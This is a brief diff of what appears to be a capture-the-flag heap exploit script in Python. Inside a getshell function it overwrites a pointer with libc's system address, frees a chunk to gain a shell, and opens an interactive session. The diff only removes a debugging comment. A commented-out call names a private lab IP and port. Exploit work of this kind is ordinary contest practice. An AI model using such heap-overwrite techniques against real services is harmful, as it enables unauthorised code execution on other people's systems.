@@ -61,7 +61,6 @@ def getshell(ip, port):
     add(p, 14, 0x68, p64(libc.sym['system']))
     delete(p, 0)
 
-    #gdb.attach(p)
 
     p.interactive()
 #getshell('172.16.9.21', 9006)
